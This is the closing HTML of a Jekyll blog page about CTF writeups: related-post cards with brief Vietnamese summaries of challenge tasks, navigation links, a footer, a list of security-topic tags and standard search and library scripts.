+
+  
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  <aside id="related-posts" aria-labelledby="related-label">
+    <h3 class="mb-4" id="related-label">Further Reading</h3>
+    <nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4">
+      
+        <article class="col">
+          <a href="/posts/AsisCTF/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1695571200"
+  data-df="ll"
+  
+>
+  Sep 24, 2023
+</time>
+
+              <h4 class="pt-0 my-2">Asis CTF 2023 Writeup</h4>
+              <div class="text-muted">
+                <p>Asis-CTF-2023-Writeup
+Bài 1 hello:
+
+  Tóm tắt đề thì đại khái là đề bảo chúng ta phải request một cái method get có parameter là x lên Web sao cho không có chữ next và chữ file là được, nhưng mà mu...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/Wannagame-Freshman/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1699718400"
+  data-df="ll"
+  
+>
+  Nov 11, 2023
+</time>
+
+              <h4 class="pt-0 my-2">Wannagame Freshman CTF writeup</h4>
+              <div class="text-muted">
+                <p>WannaWinFreshman-Writeup
+Bài 1 Warmup PHP:
+
+
+
+  Tóm tắt đề thì đại khái là đề bảo chúng ta phải POST data lên dưới dạng json có key là page và sau đó chương trình sẽ server sẽ decode ra và đọc file...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+        <article class="col">
+          <a href="/posts/PicoCTF2024/" class="post-preview card h-100">
+            <div class="card-body">
+              <!--
+  Date format snippet
+  See: ${JS_ROOT}/utils/locale-dateime.js
+-->
+
+
+
+
+<time
+  
+  data-ts="1711555200"
+  data-df="ll"
+  
+>
+  Mar 27, 2024
+</time>
+
+              <h4 class="pt-0 my-2">PicoCTF 2024</h4>
+              <div class="text-muted">
+                <p>PicoCTF2024 đã kết thúc, giải này mình có khá nhiều nuối tiếc vì bài cuối web quá khó, dù không clear nhưng team Zafk1el tụi mình đã cố gắng hết sức. Tiện đây mình viết writeup một số bài đáng chú ...</p>
+              </div>
+            </div>
+          </a>
+        </article>
+      
+    </nav>
+  </aside>
+  <!-- #related-posts -->
+
+
+            
+              
+              <!-- Navigation buttons at the bottom of the post. -->
+
+<nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation">
+  
+  
+
+  
+    <a
+      href="/posts/PicoCTF2024/"
+      class="btn btn-outline-primary"
+      aria-label="Older"
+    >
+      <p>PicoCTF 2024</p>
+    </a>
+  
+
+  
+    <a
+      href="/posts/GreyCTF/"
+      class="btn btn-outline-primary"
+      aria-label="Newer"
+    >
+      <p>GreyCTF 2024</p>
+    </a>
+  
+</nav>
+
+            
+              
+              <!-- The comments switcher -->
+
+
+            
+
+            <!-- The Footer -->
+
+<footer
+  aria-label="Site Info"
+  class="
+    d-flex flex-column justify-content-center text-muted
+    flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3
+  "
+>
+  <p>©
+    <time>2024</time>
+
+    
+      <a href="https://github.com/anzuukino">Yuu</a>.
+    
+
+    
+      <span
+        data-bs-toggle="tooltip"
+        data-bs-placement="top"
+        title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author."
+      >Some rights reserved.</span>
+    
+  </p>
+
+  <p>Using the <a
+        data-bs-toggle="tooltip"
+        data-bs-placement="top"
+        title="v6.5.5"
+        href="https://github.com/cotes2020/jekyll-theme-chirpy"
+        target="_blank"
+        rel="noopener"
+      >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.
+  </p>
+</footer>
+
+          </div>
+        </div>
+
+        <!-- The Search results -->
+
+<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
+  <div class="col-11 content">
+    <div id="search-hints">
+      <!-- The trending tags list -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+
+
+  <section>
+    <h2 class="panel-heading">Trending Tags</h2>
+    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/ssti/">SSTI</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/api-testing/">API testing</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/base64/">Base64</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/bypass-filter/">Bypass Filter</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/flask/">Flask</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/mysql/">MYSQL</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/nosql/">NoSQL</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/path-traversal/">Path Traversal</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php-webshell/">PHP Webshell</a>
+      
+        
+        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
+      
+    </div>
+  </section>
+
+
+    </div>
+    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
+  </div>
+</div>
+
+      </div>
+
+      <aside aria-label="Scroll to Top">
+        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
+          <i class="fas fa-angle-up"></i>
+        </button>
+      </aside>
+    </div>
+
+    <div id="mask"></div>
+
+    
+      <aside
+  id="notification"
+  class="toast"
+  role="alert"
+  aria-live="assertive"
+  aria-atomic="true"
+  data-bs-animation="true"
+  data-bs-autohide="false"
+>
+  <div class="toast-header">
+    <button
+      type="button"
+      class="btn-close ms-auto"
+      data-bs-dismiss="toast"
+      aria-label="Close"
+    ></button>
+  </div>
+  <div class="toast-body text-center pt-0">
+    <p class="px-2 mb-3">A new version of content is available.</p>
+    <button type="button" class="btn btn-primary" aria-label="Update">
+      Update
+    </button>
+  </div>
+</aside>
+
+    
+
+    <!-- JavaScripts -->
+
+    <!-- JS selector for site. -->
+
+<!-- commons -->
+
+
+
+<!-- layout specified -->
+
+
+
+
+  
+
+  
+    <!-- image lazy-loading & popup & clipboard -->
+    
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+  
+    
+
+    
+
+  
+
+
+
+  <script src="https://cdn.jsdelivr.net/combine/npm/jquery@3.7.1/dist/jquery.min.js,npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js,npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js,npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.umd.min.js,npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js,npm/clipboard@2.0.11/dist/clipboard.min.js,npm/dayjs@1.11.10/dayjs.min.js,npm/dayjs@1.11.10/locale/en.min.js,npm/dayjs@1.11.10/plugin/relativeTime.min.js,npm/dayjs@1.11.10/plugin/localizedFormat.min.js,npm/tocbot@4.25.0/dist/tocbot.min.js"></script>
+
+
+
+
+
+
+<script defer src="/assets/js/dist/post.min.js"></script>
+
+
+
+<!-- Pageviews -->
+
+  
+
+  
+
+
+
+
+
+    
+
+    <!--
+  Jekyll Simple Search loader
+  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
+-->
+
+
+
+
+
+<script>
+  /* Note: dependent library will be loaded in `js-selector.html` */
+  SimpleJekyllSearch({
+    searchInput: document.getElementById('search-input'),
+    resultsContainer: document.getElementById('search-results'),
+    json: '/assets/js/data/search.json',
+    searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
+    noResultsText: '<p class="mt-5">Oops! No results found.</p>',
+    templateMiddleware: function(prop, value, template) {
+      if (prop === 'categories') {
+        if (value === '') {
+          return `${value}`;
+        } else {
+          return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
+        }
+      }
+
+      if (prop === 'tags') {
+        if (value === '') {
+          return `${value}`;
+        } else {
+          return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
+        }
+      }
+    }
+  });
+</script>
+
+  </body>
+</html>
+
